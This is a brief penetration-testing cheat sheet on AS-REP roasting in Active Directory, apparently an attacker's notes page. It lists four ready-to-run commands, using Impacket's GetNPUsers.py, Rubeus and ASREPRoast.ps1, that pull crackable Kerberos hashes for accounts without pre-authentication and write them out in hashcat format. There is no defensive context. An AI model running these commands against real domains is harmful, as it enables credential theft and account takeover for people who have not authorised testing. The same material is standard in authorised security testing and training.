

Account takeover techniques

<b>ASREP-Roasting:</b>

Exploit technqiues:
<ol>
<li>python GetNPUsers.py CHANGEME.LOCAL/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast</li>
<li>python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast</li>
<li>.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]</li>
<li>Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</li>
</ol>

